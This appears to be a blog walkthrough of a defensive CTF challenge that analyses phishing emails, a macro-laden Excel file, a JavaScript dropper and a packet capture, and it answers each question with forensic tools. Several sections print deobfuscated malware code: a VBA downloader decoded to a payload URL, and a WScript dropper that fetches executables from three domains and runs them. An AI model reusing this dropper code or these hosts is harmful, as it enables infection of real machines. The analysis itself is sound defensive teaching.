---
layout: write_up
title: Malware Traffic Analysis 5
---

## Introduction

With this post we will be discussing the solutions for the challenge [Malware Traffic Analysis](https://cyberdefenders.org/blueteam-ctf-challenges/58) on Cyberdefenders.

<h4 style="padding-left:18px; padding-top:12px"> Tools </h4>
<div style="padding-left:18px;" markdown="1" id="tools-list">
Suggested by the platform:

* [BrimSecurity](https://www.brimsecurity.com/)
* [NetworkMiner](https://www.netresec.com/?page=networkminer)
* [WireShark](https://www.wireshark.org/)
* [Hybrid-Analysis](https://www.hybrid-analysis.com/) (online tool)

Suggested by me:

* [EML Analyzer](https://eml-analyzer.herokuapp.com/) (online tool)
* [OleDump](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py)
* [OleTools](https://github.com/decalage2/oletools/tree/master/oletools)
* [PEStudio](https://www.winitor.com/download)

> _NOTE:_ I had some issues with `BrimSecurity` because with the newest version I couldn't follow the tutorial and I didn't know how to set `suricatarunner` and its `rules`. If you are in my same situation you could try installing an older version -- I used the v0.22.0 whose installer is available under the section "assets" [here](https://github.com/brimdata/zui/releases/tag/v0.22.0). If the program complains about connection errors you could just run it as administrator/root.

</div>

<br>

## Guide

With the given scenario we know that mail filters are down and spam mails are reaching the employees of our company -- thus, we can expect the given `.eml` files to contain malicious links/attachments.

Let's start with the first question:

    c41-MTA5-email-01: What is the name of the malicious file?

Since they are asking for the name of a file, we should check for attachments inside the given email. Upload `c41-MTA5-email-01.eml` to **EML Analyzer** and download the attached file `dawning wall up.zip`. Within the zip we can find the sospicious file <code class="flag">460630672421.exe</code> -- this is the flag to submit. Let's go on.

<br>

    c41-MTA5-email-01: What is the name of the trojan family the malware belongs to? (As identified by emerging threats ruleset).

For this question you have to extract the suspicious file and upload it to **Hybrid-Analysis**; within the analysis overview we can read `Labeled as: Trojan.Upatre.Generic`, thus the flag to submit is <code class="flag">upatre</code>. Easy, right? Next Question!

<br>

    c41-MTA5-email-01: The malware dropped two malicious files with the same hash but with different names. Provide the SHA256 hash of those files? (Check the report submitted in 2015). 

For this task we still require the use of **Hybrid-Analysis**, but this time, as per requested by the platform, you have to find for a specific report submitted in 2015. Once on the homepage of the website go to `Report Search` and insert the hash of the malicious file (the sha256 is `0e3c8fbe4725db48bbd7c84a3cc748ea678fa645ac4e01cd540cb29023923360`). Under `Malicious Indicators` and then `General` we can find the entry `The input sample dropped a file that was identified as malicious` which tells us that the malware dropped two malicious files, `hloxfesko.exe` and `lDrlorjtSRMEMQq.exe`. Now let's go to `Extracted Files` were we can finally observe that those two files have the same hash -- the sha256, and, thus, the flag to submit, is <code class="flag">d1818c3fbbb1f09d8998ad44d14ee9a4fbfae5a1bb58128c2ac077a06d7f84b9</code>. This one required just a little more of work, but that was nothing crazy. Next!

<br>

    c41-MTA5-email-01: How many DNS requests were initiated by the malware? (Check the report submitted in 2015).

Using the same report of the previous question, go under `Network Analysis`, `DNS Requests`, count them and the answer is <code class="flag">3</code>.



<br>

    c41-MTA5-email-02: Multiple streams contain macros in this document. Provide the number of the highest one.

Now we have to analyze another file: upload `c41-MTA5-email-02.eml` to **EML Analyzer** and download the attached file `Bill Payment_000010818.xls`. For this task we will be using the tool `oledump.py`: execute `python oledump.py /path/to/file`. The uppercase `M` stands for `macro` and the number on the left indicates the stream number -- since the question asks for the highest one, the flag to submit is <code class="flag">20</code>.

<br>

    c41-MTA5-email-02: The Excel macro tried to download a file. Provide the full URL of this file?

This is a little trickier. Let's extract the macros contained in the `.xls` file: `olevba /path/to/file > olevba_out.txt` and open the output file.
The first interesting line we find analysing it is:
```vba
valdis = Array(6340, 6352, 6352, 6348, 6294, 6283, 6283, 6333, 6336, 6354, 6333, 6346, 6335, 6337, 6336, 6339, 6350, 6347, 6353, 6348, 6282, 6346, 6337, 6352, 6282, 6333, 6353, 6283, 6362, 6341, 6346, 6335, 6333, 6346, 6352, 6341, 6346, 6283, 6287, 6287, 6288, 6339, 6289, 6342, 6291, 6290, 6283, 6292, 6293, 6291, 6341, 6291, 6353, 6356, 6349, 6337, 6282, 6337, 6356, 6337)
```
That's a curious array, isn't it? Just after a few lines we can observe another suspicious line which is using the `valdis` variable:
```vba
.Open "G" + "ET", Pochemu(valdis, 59), False
```
There is an high chance that the author of the malware is trying to obfuscate the `GET` request, so it's worth to investigate further this two incriminated lines. Let's have a look at `Pochemu` and its definition:
```vba
Public Function Pochemu(Z() As Variant, oldLen As Integer) As String
Dim n As Integer
For n = LBound(Z) To UBound(Z)
 Pochemu = Pochemu & Chr(Z(n) - 4 * oldLen - 6000)
Next n
End Function
```
Let's try to reproduce the behaviour of this function -- I used this python script (note that `oldLen` is `59` as per `Pochemu(valdis, 59)`):
```python
valdis = [
	6340, 6352, 6352, 6348, 6294,
	6283, 6283, 6333, 6336, 6354,
	6333, 6346, 6335, 6337, 6336,
	6339, 6350, 6347, 6353, 6348,
	6282, 6346, 6337, 6352, 6282,
	6333, 6353, 6283, 6362, 6341,
	6346, 6335, 6333, 6346, 6352,
	6341, 6346, 6283, 6287, 6287,
	6288, 6339, 6289, 6342, 6291,
	6290, 6283, 6292, 6293, 6291,
	6341, 6291, 6353, 6356, 6349, 
	6337, 6282, 6337, 6356, 6337
]

decoded = ""
for i in range(len(valdis)):
	decoded += chr(valdis[i] - 4*59 - 6000)
print(decoded)
```
The output will be <code class="flag">http://advancedgroup.net.au/~incantin/334g5j76/897i7uxqe.exe</code> -- that's the flag!

<br>

    c41-MTA5-email-02: What is the name of the object used to get data from the download URL?

Let's open again the output of `olevba`; in particular, to the incriminated piece of code:
```vba
With read_same_ch_from3
.Open "G" + "ET", Pochemu(valdis, 59), False
.Send
End With
```
We can see that the URL was passed as parameter to the `Open` method of `read_same_ch_from3`; let's find its definition:
```vba
Set read_same_ch_from3 = CreateObject("Microsof" + zilibobe + ".XMLH" + UCase(zilibobe) + "TP")
``` 
We are almost there to find out the name of the object that was used to get data from the download URL, we just have to find the definition of `zilibobe` which is:
```vba
Public Const zilibobe = "t"
```
`zilibobe` is taken in the uppercase form, thus the concateneted string, and the flag to submit, is <code class="flag">Microsoft.XMLHTTP</code>. Let's go!

<br>

    c41-MTA5-email-02: The Excel macro writes a file to the temp folder. Provide the filename? 

We can imagine the after the `GET` request we will find the code that will handle the downloaded data and save it in the computer -- in fact, gere it is:
```vba
root_order4.write read_same_ch_from3.responseBody
root_order4.savetofile ce_de_ge3, 2
```
Now we just have to look for the definition of `ce_de_ge3`:
```vba
hermando5 = string_ty_pe4(UCase(zilibobe) + "EMP")
rudnik = Chr(Asc(UCase(zilibobe)) + 17)
ce_de_ge3 = hermando5 + Chr(Asc(zilibobe) - 24) + zilibobe + "gh" + zilibobe + "op" + "." + rudnik + "x" + rudnik
```
Let's start from `hermando5`:
```vba
Set string_ty_pe4 = CreateObject("WScrip" + zilibobe + ".Shell").Environment("Process")
```
So, `string_ty_pe4` is the process environment, from which the malware points to the `TEMP` folder (remember that `zilibobe` is a `t`) -- we are definitely finding the answer for this question.
Looking at the ASCII table, `rudnik` is `e` (note that you have to sum the ASCII value of `T`, thus `84+17=101`).
`Chr(Asc(zilibobe) - 24)` resolves to `\` (note that this time you have to use the ASCII value of `t`, thus `116-24=92`). Put all this together and you'll find the flag to submit: <code class="flag">tghtop.exe</code>.

<br>

    c41-MTA5-email-03: Provide the FQDN used by the attacker to store the login credentials?

Upload `c41-MTA5-email-03.eml` to **EML Analyzer** and download the attachment, which is an `html` page.
We will be using **Hybrid-Analysis** again, so upload the downloaded file there and open the report under `Falcon Sandbox Reports`. Under `Network Analysis` we can see activity with the FQDN <code class="flag">jpmmotos.pt</code> -- let's continue!

<br>

    c41-MTA5-email-04: How many FQDNs are present in the malicious js?

Again, upload `c41-MTA5-email-03.eml` to **EML Analyzer** and download the attachment, which is a `zip` -- extract the `js` file and open it: quite difficult to read, uh? No problem, just copy-paste it to [Beautifier](https://beautifier.io/). Unfortunately, the program is still obfuscated, so the next step is trying to understand what does it do: copy-paste the prettier code to a JS online compiler like [Programiz](https://www.programiz.com/javascript/online-compiler/). What do we do now? Let's have a look at the last line:
```js
w0()(u7);
```
And split it like this:
```js
console.log(w0());
console.log(u7);
```
Now run the whole program, the output will be:
```js
[Function: eval]
var b = "kennedy.sitoserver.com nzvincent.com abama.org".split(" "); var ws = WScript.CreateObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%")+String.fromCharCode(92)+"799755"; var xo = WScript.CreateObject("MSXML2.XMLHTTP"); var xa = WScript.CreateObject("ADODB.Stream"); var ld = 0; for (var n=1; n<=3; n++) { for (var i=ld; i<b.length; i++) { var dn = 0; try { xo.open("GET","http://"+b[i]+"/counter/?id="+str+"&rnd=309034"+n, false); xo.send(); if (xo.status == 200) { xa.open(); xa.type = 1; xa.write(xo.responseBody); if (xa.size > 1000) { dn = 1; xa.position = 0; xa.saveToFile(fn+n+".exe",2); try { ws.Run(fn+n+".exe",1,0); } catch (er) { }; }; xa.close(); }; if (dn == 1) { ld = i; break; }; } catch (er) { }; }; };
```
We can thus observe that the malware is evaluating the code contained in the `u7` variable; let's make its content, the code, prettier again:
```js
var b = "kennedy.sitoserver.com nzvincent.com abama.org".split(" ");
var ws = WScript.CreateObject("WScript.Shell");
var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + "799755";
var xo = WScript.CreateObject("MSXML2.XMLHTTP");
var xa = WScript.CreateObject("ADODB.Stream");
var ld = 0;
for (var n = 1; n <= 3; n++) {
    for (var i = ld; i < b.length; i++) {
        var dn = 0;
        try {
            xo.open("GET", "http://" + b[i] + "/counter/?id=" + str + "&rnd=309034" + n, false);
            xo.send();
            if (xo.status == 200) {
                xa.open();
                xa.type = 1;
                xa.write(xo.responseBody);
                if (xa.size > 1000) {
                    dn = 1;
                    xa.position = 0;
                    xa.saveToFile(fn + n + ".exe", 2);
                    try {
                        ws.Run(fn + n + ".exe", 1, 0);
                    } catch (er) {};
                };
                xa.close();
            };
            if (dn == 1) {
                ld = i;
                break;
            };
        } catch (er) {};
    };
};
```
Within the first line we count <code class="flag">3</code> FQDNs.

<br>

    c41-MTA5-email-04: What is the name of the object used to handle and read files?

Reading the previous code, we can observe that the variable used to handle and read files is `xa`, which is an <code class="flag">ADODB.Stream</code> object -- we have found another flag!

<br>

    c41-MTA5.pcap: The victim received multiple emails; however, the user opened a single attachment. Provide the attachment filename.

Upload the `.pcap` to **BrimSecurity** and look for network indicators of one of the 5 malware that we have previously disclosed with our analysis (connections, files downloaded, etc.). In particular, we can see a connection to `kennedy.sitoserver.com`, which was one of the three FQDNs that we have found inside the attachment of the last mail, whose name was <code class="flag">fax000497762.zip</code> -- this is the flag.

<br>

    c41-MTA5.pcap: What is the IP address of the victim machine?

With **BrimSecurity** we just have to check which IP made the DNS request for `kennedy.sitoserver.com` using the filter `query=kennedy.sitoserver.com` -- we can see that the IP that originated the request was <code class="flag">10.3.66.103</code>.

<br>

    c41-MTA5.pcap: What is the hostname of the victim machine?

Upload the `.pcap` to **NetworkMiner**, use the previous ip (`10.3.66.103`) as filter under the `Hosts` tab and you can find the victim machine's hostname, which is <code class="flag">Strout-PC</code>.

<br>

    c41-MTA5.pcap: What is the FQDN that hosted the malware?

As previously noticed, the FQDN that hosted the malware is <code class="flag">kennedy.sitoserver.com</code>.

<br>

    c41-MTA5.pcap: The opened attachment wrote multiple files to the TEMP folder. Provide the name of the first file written to the disk?

We have to analyze the JS code previously extracted, I will write it here again omitting the non-interesting parts:
```js
var b = "kennedy.sitoserver.com nzvincent.com abama.org".split(" ");
var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + "799755";
//[...]
var xa = WScript.CreateObject("ADODB.Stream");
var ld = 0;
for (var n = 1; n <= 3; n++) {
    for (var i = ld; i < b.length; i++) {
        //[...]
                    xa.saveToFile(fn + n + ".exe", 2);
        //[...]
    };
};
```
Given that `92` translates to `\` in the ASCII table, and that in the first iteration `n` is set to `1`, the flag to submit is <code class="flag">7997551.exe</code>.

<br>

    c41-MTA5.pcap: One of the written files to the disk has the following md5 hash "35a09d67bee10c6aff48826717680c1c"; Which registry key does this malware check for its existence?

With **BrimSecurity** we can find the connection that dropped the file with the given md5 hash using the filter `md5=35a09d67bee10c6aff48826717680c1c` -- open the log details of the found entry and look for the `ip` and `port` of origin for that http connection which are, respictively, `10.3.66.103` and `49158`. Now we have to extract the file transferred during that connection. Open the `.pcap` file with **Wireshark** and use the filter `http and ip.addr == 10.3.66.103 and tcp.port == 49158`: you can see that the server sent us three files with packets n. `571`, `797` and `1480` -- we have to extract them all, calculate the md5 hash and find the right file to analyse. Go to `file`, `Export Objects`, `HTTP`, and save the packets within the 3 previous number one by one (I renamed them with the number of the packet they were related to). If you calculate the md5 hash of them, you'll find out that the file to analyze is the one transferred within the packet n.`1480`. Open the file with **PEStudio** and look for hardcoded strings -- you will find a string containing the registry key which is <code class="flag">9a83a958-b859-11d1-aa90-00aa00ba3258</code>.

<br>

    c41-MTA5.pcap: One of the written files to the disk has the following md5 hash "e2fc96114e61288fc413118327c76d93" sent an HTTP post request to "upload.php" page. Provide the webserver IP. (IP is not in PCAP) 

The incriminated file is the one transferred within packet n.`571`. Load it to **Hybrid-Analysis** and open the report under `Falcon Sandbox Reports`. Go to `Network Analysis`, then `HTTP Traffic` where you will find a `POST` request to the url `78.24.220.229/upload.php` -- thus, the flag to submit is <code class="flag">78.24.220.229</code>. Now last question!

<br>

    c41-MTA5.pcap: The malware initiated callback traffic after the infection. Provide the IP of the destination server. 

Looking at the `.pcap` we can observe a lot of traffic towards <code class="flag">109.68.191.31</code> which is also the flag to sumbit!

<br>
<br>

We've reached the end of this challenge, and, consequently, of this guide as well! I hope it was useful and that you enjoyed it!